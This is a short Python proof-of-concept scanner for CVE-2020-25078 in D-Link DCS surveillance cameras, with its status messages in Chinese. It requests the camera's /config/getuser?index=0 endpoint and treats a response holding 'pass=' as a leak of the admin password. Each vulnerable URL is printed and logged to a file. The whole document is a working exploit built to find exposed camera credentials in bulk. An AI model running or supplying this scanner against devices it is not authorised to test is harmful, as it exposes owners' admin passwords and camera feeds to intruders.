import requests
def dcs_admin_passwd_leak_poc(url):
    poc = r"""/config/getuser?index=0"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3,allow_redirects=False)
        if "pass=" in res.text and res.status_code == 200:
            print("【！！！！！！】存在CVE_2020_25078漏洞的url:" + url + "\n")
            with open ("存在D-Link DCS系列监控 账号密码信息泄露漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
            f.close()
        else:
            print("【×】不存在CVE_2020_25078漏洞:" + url + "\n")
    except Exception as e:
        pass